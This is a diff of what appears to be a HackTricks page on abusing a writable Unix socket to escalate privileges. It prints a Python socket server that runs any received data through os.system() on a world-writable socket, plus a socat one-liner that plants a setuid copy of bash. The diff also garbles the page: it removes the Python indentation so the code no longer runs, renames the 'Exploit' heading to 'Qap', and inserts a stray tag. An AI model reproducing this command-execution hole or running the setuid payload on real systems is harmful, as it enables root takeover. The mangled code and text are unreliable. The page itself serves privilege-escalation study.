@@ -1,5 +1,3 @@
-
-
 <details>
 
 <summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
@@ -24,42 +22,38 @@ In the following example a **unix socket is created** (`/tmp/socket_test.s`) and
 import socket
 import os, os.path
 import time
-from collections import deque    
+from collections import deque
 
 if os.path.exists("/tmp/socket_test.s"):
-  os.remove("/tmp/socket_test.s")    
+os.remove("/tmp/socket_test.s")
 
 server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
 server.bind("/tmp/socket_test.s")
 os.system("chmod o+w /tmp/socket_test.s")
 while True:
-  server.listen(1)
-  conn, addr = server.accept()
-  datagram = conn.recv(1024)
-  if datagram:
-    print(datagram)
-    os.system(datagram)
-    conn.close()
+server.listen(1)
+conn, addr = server.accept()
+datagram = conn.recv(1024)
+if datagram:
+print(datagram)
+os.system(datagram)
+conn.close()
 ```
 {% endcode %}
 
 **Execute** the code using python: `python s.py` and **check how the socket is listening**:
 
+{% endcode %}
 ```python
 netstat -a -p --unix | grep "socket_test"
 (Not all processes could be identified, non-owned process info
- will not be shown, you would have to be root to see it all.)
+will not be shown, you would have to be root to see it all.)
 unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
 ```
-
-**Exploit**
-
+**Qap**
 ```python
 echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
 ```
-
-
-
 <details>
 
 <summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
@@ -73,5 +67,3 @@ Other ways to support HackTricks:
 * **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
-
-
